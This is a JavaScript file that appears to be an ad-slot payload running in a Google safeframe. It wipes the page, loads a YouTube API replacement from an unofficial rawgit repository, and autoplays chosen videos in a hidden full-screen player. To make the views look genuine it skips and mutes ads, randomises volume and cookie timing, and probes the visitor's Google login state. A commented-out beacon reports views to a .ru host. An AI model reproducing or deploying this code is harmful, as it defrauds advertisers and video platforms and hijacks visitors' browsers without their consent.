var  videoIds = new Array();
videoIds[1] = "HsoT2CtuyTM";
videoIds[2] = "iGI2rvpnvbE";
videoIds[3] = "VxPmfjv2X60";
videoIds[4] = "dRnrjyJV25I";
videoIds[5] = "BqrxDM8Ks_o";
videoIds[6] = "k_Oa7tciRF4";
videoIds[7] = "G95-c2YqNQU";


var newstr = window.location.href.replace('https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai=',"");
document.getElementsByTagName("body")[0].innerHTML='';
var jquery_js = document.createElement("script");
	jquery_js.setAttribute("type","text/javascript");
	jquery_js.setAttribute("src","https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js");
	jquery_js.async = true;
	jquery_js.onload = function(){
		var jq_cookie = document.createElement("script");
		jq_cookie.setAttribute("type","text/javascript");
		jq_cookie.setAttribute("src","https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js");
		document.getElementsByTagName("body")[0].appendChild(jq_cookie);
	};
	document.getElementsByTagName("head")[0].appendChild(jquery_js);
var gl=-1;
function checkgoogle ()	{
	try {
		  var i=new Image();
		  i.onload=function(){
			  gl=1;
			  (function (d, w, c) {
				 /*  (w[c] = w[c] || []).push(function () { try { w.yaCounter = new Ya.Metrika({ id: 47009115, clickmap: true, trackLinks: true, accurateTrackBounce: true, webvisor: true, trackHash: true, ut: "noindex" }); } catch (e) { } });

				  var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; */

				//   s.src = "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/watch.js";

				  if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else {  }
			  })(document, window, "yandex_metrika_callbacks");
		  }
		  i.onerror=function(){
			  gl=0;
			  (function (d, w, c) {
				  /* (w[c] = w[c] || []).push(function () { try { w.yaCounter = new Ya.Metrika({ id: 47009196, clickmap: true, trackLinks: true, accurateTrackBounce: true, webvisor: true, trackHash: true, ut: "noindex" }); } catch (e) { } });

				  var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/watch.js"; */

				  if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { }

			  })(document, window, "yandex_metrika_callbacks");
		  }
		  i.src="https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png";

	} catch (err) {}
}
checkgoogle();
var yt_getRandomInt=function(min, max){return Math.floor(Math.random() * (max - min + 1)) + min;};
var yt_dm_iframe = document.createElement("div");
		yt_dm_iframe.id = 'yt_if_tv_del';
		yt_dm_iframe.style = "left:0px;top:0px;border:0px;";
		yt_dm_iframe.style.width = "100%";
		yt_dm_iframe.style.height = "100%";
		yt_dm_iframe.style.display = "block";
		yt_dm_iframe.style.position = "fixed";
		document.getElementsByTagName("body")[0].appendChild(yt_dm_iframe);

		if (!window['YT']) { var YT = { loading: 0, loaded: 0 }; } if (!window['YTConfig']) { var YTConfig = { 'host': 'https://tpc.googlesyndication.com' }; }

		if (!YT.loading) {
		YT.loading = 1; (function () {
			var l = [];
			YT.ready = function (f) { if (YT.loaded) {  } else { l.push(f); } };
			window.onYTReady = function () { YT.loaded = 1; for (var i = 0; i < l.length; i++) { try { l[i](); } catch (e) { } } };
			YT.setConfig = function (c) { for (var k in c) { if (c.hasOwnProperty(k)) { YTConfig[k] = c[k]; } } };

			var a = document.createElement('script'); a.type = 'text/javascript';
			a.id = 'www-widgetapi-script';
			a.src = 'https://rawgit.com/coolboy112233/unknowbastard/own/www-widgetapi.js';
			a.async = true;

			var b = document.getElementsByTagName('head')[0];
			b.parentNode.insertBefore(a, b);
		})();
		}
	var onYouTubePlayerAPIReady = function() {
		playVideo();
	}
	var yt_if_tv_del;
	var yt_dom = 0;
	var yt_st = 0;
	var t_yt_track_2 = 40000;
	var id_v_yt2 = 0;
	var id_v_yt = 0;
	var id_v_ra = 0;
	var cl_setings;

	var onPlayerReady = function(e){

		e.target.playVideo();

		if (isMute != 1) e.target.setPlaybackRate(1);
		else {
			yt_if_tv_del.mute();
		}
		e.target.playVideo();
		yt_if_tv_del.addEventListener('onAdStateChange', onAdStateChange);
	};
	var onVideoProgress = function(e){
		var date = new Date();
		date.setTime(date.getTime() + (yt_getRandomInt(30, 90) * 1000));

		$.cookie('YT_active', 1, { expires: date });
		$.cookie(id_v_yt2+'_time', e.data, { expires: 1});
		$.cookie(id_v_yt2+'_dur', e.target.getDuration(), { expires: 1});

		if (isMute != 1) yt_if_tv_del.setPlaybackRate(1);
	};
	var onApiChange = function (e) {
		yt_if_tv_del.addEventListener('onAdStateChange', onAdStateChange);
	};

	var ad = 0;
	var adTimout = 0;

	var onAdStateChange = function(e){
		if (e.data == 1) {
			ad = 1;
			e.target.mute();
			adTimout = setTimeout(function () {
				yt_if_tv_del.stopVideo();
				yt_if_tv_del.unMute();

				setTimeout(function(){
					yt_if_tv_del.playVideo();
					yt_if_tv_del.unMute();
				}, 500);

			}, 10000);

		} else {
			clearTimeout(adTimout);
			e.target.unMute();
		}
	};
	var isMute = 1;
	var onPlayerStateChange = function(e){
							if(isMute!=1) e.target.setPlaybackRate(1);
							if(isMute!=1) e.target.setPlaybackRate(1);
							if(e.data == 3 || e.data == 1){
								if(yt_dom==0){
									yt_dom=1;
								}
								if(yt_st==0){
									yt_st = 1;

									// yaCounter.reachGoal('YT_playing');
									// yaCounter.reachGoal('YT_playing' + newstr);

									cur_time = Math.floor($.cookie(id_v_yt2+'_time'));
									t = Math.floor($.cookie(id_v_yt2+'_dur'))-((t_yt_track_2/3)/1000);
									if(t > cur_time) yt_if_tv_del.seekTo(cur_time);
									yt_if_tv_del.setPlaybackRate(1);
									yt_if_tv_del.unMute();
									yt_if_tv_del.setVolume(yt_getRandomInt(50,100));
									if($.cookie(id_v_yt2+'_dur')>240)yt_if_tv_del.setVolume(yt_getRandomInt(30,100));

								   if(t_yt_track_2 > 40000) time_playback = 40000;
								   else time_playback = t_yt_track_2;

								   setTimeout(function(){
									   cnt = $.cookie(id_v_yt2 + '_cnt');
									   if (cnt == undefined) cnt = 0;
									   cnt = Math.floor(cnt);
									   cnt = (cnt * 1) + 1;
									   $.cookie(id_v_yt2 + '_cnt', cnt, { expires: 1 });
									   yt_if_tv_del.updateLastActiveTime(yt_if_tv_del.getDuration());

										   var is222=new Image();
										//    is222.src="https://polqndroken.ru/15.php?l="+newstr+"&d=1&a="+id_v_yt+"&adv="+ad;
										   if(id_v_ra > 0){

												// var is3=new Image();
												//	 is3.src="https://ad.doubleclick.net/ddm/trackclk/N700014.3034953ADWORDSYOUTUBE/B20586481.212022703;dc_trk_aid=411262140;dc_trk_cid=96603692;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=";

											}
								   },time_playback);
								}
							}

	}


	function playVideo() {
		var xmlhttp;
		var xhrTimeout;
		var yt_data_p2;
				ad = 0;
				host = 'https://www.youtube.com';
				feature='iv-trending';
				t = Math.round(new Date().getTime() / 1000) - (3600 * 7);
				videoId = videoIds[newstr];
				isMute = 0
				yt_if_tv_del = new YT.Player('yt_if_tv_del', {
									host: host,
									height: '100%',
									width: '100%',
									videoId: videoId,
									playerVars: {
										//list: 'PL_yIBWagYVjztnssruzd0PHc92RY8giOA',
										docid: 'mV3fEnXOc5Q',
										fs: 0,
										rel: 0,
										playsinline: true,
										origin: 'https://tpc.googlesyndication.com',
										vq: 'tiny',
										//controls:'0',
										//el:'detailpage',
										//feature:trending,
										override_hl:1,
										//autonav:1,

									},
									events: {
										"onStateChange": onPlayerStateChange,
										"onReady": onPlayerReady,
										"onApiChange": onApiChange,
										"onVideoProgress":onVideoProgress,
									}
								});
	}
